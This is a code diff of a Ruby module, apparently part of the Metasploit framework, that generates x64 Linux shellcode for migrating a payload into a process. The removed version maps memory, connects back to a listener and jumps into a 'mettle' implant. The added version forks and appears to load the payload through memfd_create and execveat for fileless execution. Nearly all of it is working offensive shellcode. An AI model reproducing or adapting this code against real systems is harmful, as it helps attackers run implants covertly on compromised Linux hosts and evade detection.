@@ -36,116 +36,40 @@ module Payload::Linux::X64::Migrate
     encoded_host =  "%.8x" % Rex::Socket.addr_aton("127.0.0.1").unpack("V").first
     encoded_port = "%.8x" % ["4242".to_i,2].pack("vn").unpack("N").first
     asm = %^
-      push rax
-      push rcx
-      push rdx
-      push rbx
-      push rsp
-      push rbp
-      push rdi
-      push rsi
-      push r9
-      push r10
-      push r11
-      push r12
-      push r13
-      push r14
-      push r15
-      push 0x9
-      pop rax
-      xor rdi, rdi
-      push #{opts[:payload_length]}
-      pop rsi
-      push 0x6
-      pop rdx
-      push 0x22
-      pop r10
-      xor r8,r8
-      dec r8
-      xor r9, r9
-      syscall ; mmap
-      
-      push rax
-      pop r9
-      int 3 ; stop and copy payload there
-
       push 0x39
       pop rax
       syscall ; fork()
-      
       cmp rax, 0
       jz _exec_child
 _exec_parent:
-      pop r15
-      pop r14
-      pop r13
-      pop r12
-      pop r11
-      pop r10
-      pop r9
-      pop rsi
-      pop rdi
-      pop rbp
-      pop rsp
-      pop rbx
-      pop rdx
-      pop rcx
-      pop rax
       int 3
 _exec_child:
+      xor rsi, rsi
+      push rsi
+      lea rdi, [rsp]
+      inc rsi
+      mov rax, 0x13f
+      syscall
 
-      push   0x29
-      pop    rax
-      cdq
-      push   0x2
-      pop    rdi
-      push   0x1
-      pop    rsi
-      syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
-      xchg   rdi, rax             ; rdi = socket fd
+      mov rdi, rax 
+      mov rdx, #{opts[:payload_length]}
+      xchg rsi, r9
+      xor rax, rax
+      inc rax
+      syscall
 
-      ; Connect back to the framework
-      mov    rcx, 0x#{encoded_host}#{encoded_port}
-      push   rcx
-      mov    rsi, rsp
-      push   0x10
-      pop    rdx
-      push   0x2a
-      pop    rax
-      syscall ; connect(sockfd, {sa_family=AF_INET, LPORT, LHOST}, 16)
+      xor r10, r10
+      xor r8, r8
+      mov r8, 0x1000
+      push r10
+      lea rsi, [rsp]
+      mov eax, 0x142
+      syscall
 
-      ; Detach from the target process session
-      push   0x70
-      pop    rax
-      syscall ; setsid
+_wait:
+      nop
+      jmp _wait
 
-      ; Set up the mettle process stack
-      xchg rsi, r9                ; rsi = mmap'd address (payload), r9 = old rsi
-
-      push #{opts[:payload_length]}
-      pop rdx
-      and rsp, -0x10              ; Align
-      add sp, 80                  ; Add room for initial stack and prog name
-      mov rax, 109                ; prog name "m"
-      push rax                    ;
-      mov rcx, rsp                ; save the stack
-      xor rbx, rbx
-      push rbx                    ; NULL
-      push rbx                    ; AT_NULL
-      push rsi                    ; mmap'd address
-      mov rax, 7                  ; AT_BASE
-      push rax
-      push rbx                    ; end of ENV
-      push rbx                    ; NULL
-      push rdi                    ; ARGV[1] int sockfd
-      push rcx                    ; ARGV[0] char *prog_name
-      mov rax, 2                  ; ARGC
-      push rax
-
-      ; down the rabbit hole
-      mov rax, #{entry_offset}
-      add rsi, rax
-      jmp rsi
 ^
 
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
